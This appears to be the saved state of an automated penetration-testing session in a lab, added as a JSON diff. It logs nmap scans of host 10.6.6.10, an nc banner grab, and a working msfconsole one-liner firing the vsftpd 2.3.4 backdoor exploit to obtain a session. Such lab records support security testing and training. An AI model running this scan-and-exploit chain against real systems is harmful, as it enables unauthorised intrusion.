@@ -1,0 +1,499 @@
+{
+  "session_id": "20260521_023041_mvp_session",
+  "name_enterprise": "ITIS",
+  "scope": {
+    "target": "10.6.6.10"
+  },
+  "goal": {
+    "type": "obtain_session"
+  },
+  "networks": [],
+  "hosts": {
+    "10.6.6.10": {
+      "ip": "10.6.6.10",
+      "alive": true,
+      "ports": {
+        "21": {
+          "port": 21,
+          "proto": "tcp",
+          "state": "open",
+          "service": "ftp"
+        },
+        "22": {
+          "port": 22,
+          "proto": "tcp",
+          "state": "open",
+          "service": "ssh"
+        },
+        "23": {
+          "port": 23,
+          "proto": "tcp",
+          "state": "open",
+          "service": "telnet"
+        },
+        "25": {
+          "port": 25,
+          "proto": "tcp",
+          "state": "open",
+          "service": "smtp"
+        },
+        "139": {
+          "port": 139,
+          "proto": "tcp",
+          "state": "open",
+          "service": "netbios-ssn"
+        },
+        "445": {
+          "port": 445,
+          "proto": "tcp",
+          "state": "open",
+          "service": "microsoft-ds"
+        },
+        "512": {
+          "port": 512,
+          "proto": "tcp",
+          "state": "open",
+          "service": "exec"
+        },
+        "513": {
+          "port": 513,
+          "proto": "tcp",
+          "state": "open",
+          "service": "login"
+        },
+        "514": {
+          "port": 514,
+          "proto": "tcp",
+          "state": "open",
+          "service": "shell"
+        },
+        "1099": {
+          "port": 1099,
+          "proto": "tcp",
+          "state": "open",
+          "service": "rmiregistry"
+        },
+        "1524": {
+          "port": 1524,
+          "proto": "tcp",
+          "state": "open",
+          "service": "ingreslock"
+        },
+        "2121": {
+          "port": 2121,
+          "proto": "tcp",
+          "state": "open",
+          "service": "ccproxy-ftp"
+        },
+        "3306": {
+          "port": 3306,
+          "proto": "tcp",
+          "state": "open",
+          "service": "mysql"
+        },
+        "5432": {
+          "port": 5432,
+          "proto": "tcp",
+          "state": "open",
+          "service": "postgresql"
+        },
+        "8009": {
+          "port": 8009,
+          "proto": "tcp",
+          "state": "open",
+          "service": "ajp13"
+        },
+        "8180": {
+          "port": 8180,
+          "proto": "tcp",
+          "state": "open",
+          "service": "unknown"
+        },
+        "3632": {
+          "port": 3632,
+          "proto": "tcp",
+          "state": "open",
+          "service": "distccd"
+        },
+        "8787": {
+          "port": 8787,
+          "proto": "tcp",
+          "state": "open",
+          "service": "msgsrvr"
+        },
+        "40153": {
+          "port": 40153,
+          "proto": "tcp",
+          "state": "open",
+          "service": "unknown"
+        }
+      },
+      "services": {},
+      "web_paths": [],
+      "smb_shares": [],
+      "candidate_vulns": [],
+      "source": "nmap"
+    }
+  },
+  "services": [],
+  "net": {
+    "interfaces": [
+      {
+        "name": "lo",
+        "flags": [
+          "LOOPBACK",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [
+          {
+            "ip": "127.0.0.1",
+            "prefix": 8
+          }
+        ],
+        "ipv6": [
+          {
+            "ip": "::1",
+            "prefix": 128
+          }
+        ],
+        "mac": ""
+      },
+      {
+        "name": "eth0",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [
+          {
+            "ip": "10.0.2.15",
+            "prefix": 24
+          }
+        ],
+        "ipv6": [
+          {
+            "ip": "fe80::a00:27ff:fe40:ac0e",
+            "prefix": 64
+          }
+        ],
+        "mac": "08:00:27:40:ac:0e"
+      },
+      {
+        "name": "br-ecf1f359f0b2",
+        "flags": [
+          "NO-CARRIER",
+          "BROADCAST",
+          "MULTICAST",
+          "UP"
+        ],
+        "ipv4": [
+          {
+            "ip": "172.18.0.1",
+            "prefix": 24
+          }
+        ],
+        "ipv6": [],
+        "mac": "72:4a:e4:40:a3:b0"
+      },
+      {
+        "name": "br-146eb55e32e4",
+        "flags": [
+          "NO-CARRIER",
+          "BROADCAST",
+          "MULTICAST",
+          "UP"
+        ],
+        "ipv4": [
+          {
+            "ip": "172.19.0.1",
+            "prefix": 24
+          }
+        ],
+        "ipv6": [],
+        "mac": "ce:c6:f5:82:9d:a6"
+      },
+      {
+        "name": "docker0",
+        "flags": [
+          "NO-CARRIER",
+          "BROADCAST",
+          "MULTICAST",
+          "UP"
+        ],
+        "ipv4": [
+          {
+            "ip": "172.17.0.1",
+            "prefix": 16
+          }
+        ],
+        "ipv6": [],
+        "mac": "6a:57:0b:b9:ab:47"
+      },
+      {
+        "name": "br-2ff159ab31ba",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [
+          {
+            "ip": "10.6.6.1",
+            "prefix": 24
+          }
+        ],
+        "ipv6": [
+          {
+            "ip": "fe80::b4c4:a7ff:fe96:d504",
+            "prefix": 64
+          }
+        ],
+        "mac": "b6:c4:a7:96:d5:04"
+      },
+      {
+        "name": "veth984b997@if2",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [],
+        "ipv6": [
+          {
+            "ip": "fe80::4833:33ff:feac:e47c",
+            "prefix": 64
+          }
+        ],
+        "mac": "4a:33:33:ac:e4:7c"
+      },
+      {
+        "name": "veth0b31169@if2",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [],
+        "ipv6": [
+          {
+            "ip": "fe80::8ea:3ff:fef8:d498",
+            "prefix": 64
+          }
+        ],
+        "mac": "0a:ea:03:f8:d4:98"
+      },
+      {
+        "name": "vethe278015@if2",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [],
+        "ipv6": [
+          {
+            "ip": "fe80::30d2:2aff:fec7:e0c5",
+            "prefix": 64
+          }
+        ],
+        "mac": "32:d2:2a:c7:e0:c5"
+      },
+      {
+        "name": "vethe4d4c01@if2",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [],
+        "ipv6": [
+          {
+            "ip": "fe80::2085:98ff:fea4:706b",
+            "prefix": 64
+          }
+        ],
+        "mac": "22:85:98:a4:70:6b"
+      },
+      {
+        "name": "veth834c6a4@if2",
+        "flags": [
+          "BROADCAST",
+          "MULTICAST",
+          "UP",
+          "LOWER_UP"
+        ],
+        "ipv4": [],
+        "ipv6": [
+          {
+            "ip": "fe80::34bc:48ff:fee9:7f9c",
+            "prefix": 64
+          }
+        ],
+        "mac": "36:bc:48:e9:7f:9c"
+      }
+    ],
+    "ipv4": [],
+    "default_gw": [],
+    "arp_neighbors": [
+      {
+        "ip": "10.6.6.20",
+        "dev": "br-2ff159ab31ba",
+        "mac": "66:af:db:00:05:bf",
+        "state": "STALE"
+      },
+      {
+        "ip": "10.6.6.40",
+        "dev": "br-2ff159ab31ba",
+        "mac": "7a:70:ed:0f:1e:10",
+        "state": "STALE"
+      },
+      {
+        "ip": "10.6.6.10",
+        "dev": "br-2ff159ab31ba",
+        "mac": "1e:5f:32:e3:77:d3",
+        "state": "STALE"
+      },
+      {
+        "ip": "10.6.6.30",
+        "dev": "br-2ff159ab31ba",
+        "mac": "3a:3c:44:6d:40:58",
+        "state": "STALE"
+      },
+      {
+        "ip": "10.6.6.50",
+        "dev": "br-2ff159ab31ba",
+        "mac": "46:9f:cc:12:43:5d",
+        "state": "STALE"
+      },
+      {
+        "ip": "10.0.2.2",
+        "dev": "eth0",
+        "mac": "52:54:00:12:35:02",
+        "state": "REACHABLE"
+      }
+    ],
+    "routes": []
+  },
+  "findings": [],
+  "notes": [
+    {
+      "type": "LOCAL_HOSTNAME_DETECTED",
+      "hostname": "kali"
+    },
+    {
+      "type": "ROUTE_TABLE",
+      "routes": [
+        {
+          "raw": "default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100",
+          "default": true,
+          "gateway": "10.0.2.2",
+          "dev": "eth0",
+          "src": "10.0.2.15"
+        },
+        {
+          "raw": "10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100",
+          "default": false,
+          "gateway": "",
+          "dev": "eth0",
+          "src": "10.0.2.15"
+        },
+        {
+          "raw": "10.6.6.0/24 dev br-2ff159ab31ba proto kernel scope link src 10.6.6.1",
+          "default": false,
+          "gateway": "",
+          "dev": "br-2ff159ab31ba",
+          "src": "10.6.6.1"
+        },
+        {
+          "raw": "172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown",
+          "default": false,
+          "gateway": "",
+          "dev": "docker0",
+          "src": "172.17.0.1"
+        },
+        {
+          "raw": "172.18.0.0/24 dev br-ecf1f359f0b2 proto kernel scope link src 172.18.0.1 linkdown",
+          "default": false,
+          "gateway": "",
+          "dev": "br-ecf1f359f0b2",
+          "src": "172.18.0.1"
+        },
+        {
+          "raw": "172.19.0.0/24 dev br-146eb55e32e4 proto kernel scope link src 172.19.0.1 linkdown",
+          "default": false,
+          "gateway": "",
+          "dev": "br-146eb55e32e4",
+          "src": "172.19.0.1"
+        }
+      ]
+    },
+    {
+      "type": "SERVICE_BANNER_DETECTED",
+      "service_hint": "ftp",
+      "host": "10.6.6.10",
+      "port": 21,
+      "banner": "220 (vsFTPd 2.3.4)\n221 Goodbye."
+    },
+    {
+      "type": "FTP_ANON_LOGIN_ALLOWED",
+      "host": "10.6.6.10",
+      "port": 21,
+      "allowed": true,
+      "raw": "Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-21 02:30 +0200\nNmap scan report for 10.6.6.10\nHost is up (0.000050s latency).\n\nPORT   STATE SERVICE\n21/tcp open  ftp\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\nMAC Address: 1E:5F:32:E3:77:D3 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 0.71 seconds\n"
+    },
+    {
+      "type": "SCRIPT_RESULT",
+      "host": "10.6.6.10",
+      "port": 21,
+      "script": "ftp-anon",
+      "output": "Anonymous FTP login allowed (FTP code 230)\nftp-syst:\nSTAT:\nFTP server status:\nConnected to 10.6.6.1\nLogged in as ftp\nTYPE: ASCII\nNo session bandwidth limit\nSession timeout in seconds is 300\nControl connection is plain text\nData connections will be plain text\nvsFTPd 2.3.4 - secure, fast, stable\nEnd of status"
+    },
+    {
+      "type": "VULN_SCRIPT_RESULT",
+      "host": "10.6.6.10",
+      "port": 21,
+      "script": "ftp-anon",
+      "cves": [],
+      "output": "Anonymous FTP login allowed (FTP code 230)",
+      "source": "nmap-ftp-vuln"
+    },
+    {
+      "type": "EXPLOIT_ATTEMPTED",
+      "host": "10.6.6.10",
+      "exploit": "vsftpd_234_backdoor",
+      "source": "msfconsole"
+    }
+  ],
+  "commands": [
+    "hostname",
+    "ip a",
+    "ip r",
+    "ip neigh",
+    "nmap -sn 10.6.6.10",
+    "nmap --top-ports 1000 --open -T3 10.6.6.10",
+    "nmap -p- --open -T3 10.6.6.10",
+    "printf 'QUIT\\r\\n' | nc -nv -w 5 10.6.6.10 21",
+    "nmap --script ftp-anon -p 21 10.6.6.10",
+    "nmap -p 21 --script ftp-anon,ftp-syst --script-timeout 10s --host-timeout 30s 10.6.6.10",
+    "nmap -p 21 --script ftp-vsftpd-backdoor,ftp-anon 10.6.6.10",
+    "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.6.6.10; set RPORT 21; run -z; sessions -l; exit -y\""
+  ],
+  "focus": {
+    "level": "host",
+    "host": "10.6.6.10",
+    "service": ""
+  },
+  "step_idx": 11,
+  "last_action_id": 601,
+  "last_action_name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
+  "last_rc": 0,
+  "last_event_type": "EXPLOIT_ATTEMPTED"
+}
